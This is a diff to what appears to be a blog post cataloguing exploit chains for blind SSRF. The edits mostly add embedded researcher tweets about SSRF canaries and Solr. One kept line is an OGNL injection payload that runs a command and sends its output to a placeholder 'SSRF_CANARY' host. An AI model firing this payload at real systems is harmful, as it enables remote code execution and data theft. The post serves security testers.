@@ -6,13 +6,17 @@ Server Side Request Forgery occurs when you can coerce a server to make arbitrar
 
 ## Blind SSRF
 
-When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. In the industry, this behaviour is often referred to as "Blind SSRF". In such situations, how do we prove impact?
+When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. In the industry, this behaviour is often referred to as "Blind SSRF". In such situations, how do we prove impact? This was an interesting discussion that was sparked by Justin Gardner on Twitter:
+
+<blockquote class="twitter-tweet" data-theme="dark"><p lang="en" dir="ltr">I&#39;ve been finding a large amount of Blind SSRFs recently. What kind of one-shot RCE&#39;s have you guys used as pivots for these in the past? I&#39;ve got access to some Kafka and a bunch of other things. <a href="https://twitter.com/nnwakelam?ref_src=twsrc%5Etfw">@nnwakelam</a> <a href="https://twitter.com/thedawgyg?ref_src=twsrc%5Etfw">@thedawgyg</a></p>&mdash; Justin Gardner (@Rhynorater) <a href="https://twitter.com/Rhynorater/status/1349290375312154625?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>
 
 If you can reach internal resources, there are a number of potential exploit chains that can be executed to prove impact. This blog post attempts to go into detail for each known exploit chain when leveraging blind SSRF, and will be updated as more techniques are discovered and shared.
 
 If we've missed any techniques, please send us a tweet or a DM: [@assetnote](https://twitter.com/assetnote) and we'll add it to this blog.
 
 ## SSRF Canaries
+
+<blockquote class="twitter-tweet" data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">I tend to call them SSRF canaries, when chaining a blind SSRF to another SSRF internally which makes an additional call externally, or by an app-specific open redir or blind XXE. Confluence, Artifactory, Jenkins and JAMF have some that works well.</p>&mdash; Frans Rosén (@fransrosen) <a href="https://twitter.com/fransrosen/status/1349397387920502786?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote> 
 
 In order to validate that you can interact with internal services or applications, you can utilise "SSRF canaries". 
 
@@ -258,7 +262,7 @@ Shutdown supervisors on Apache Druid Overlords:
 
 **SSRF Canary: Shards Parameter**
 
-<blockquote class="twitter-tweet" data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">To add to what shubham is saying - scanning for solr is relatively easy. There is a shards= param which allows you to bounce SSRF to SSRF to verify you are hitting a solr instance blindly.</p>&mdash; Хавиж Наффи 🥕 (@nnwakelam) <a href="https://twitter.com/nnwakelam/status/1349298311853821956?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+<blockquote class="twitter-tweet" data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">To add to what shubham is saying - scanning for solr is relatively easy. There is a shards= param which allows you to bounce SSRF to SSRF to verify you are hitting a solr instance blindly.</p>&mdash; Хавиж Наффи 🥕 (@nnwakelam) <a href="https://twitter.com/nnwakelam/status/1349298311853821956?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>
 
 Taken from [here](https://github.com/veracode-research/solr-injection).
 
@@ -352,9 +356,7 @@ Taken from [here](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).
 Append this to the end of every internal endpoint/URL you know of:
 
 ```http
-{% raw %}
 ?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
-{% endraw %}
 ```
 
 <div id="jboss"></div>
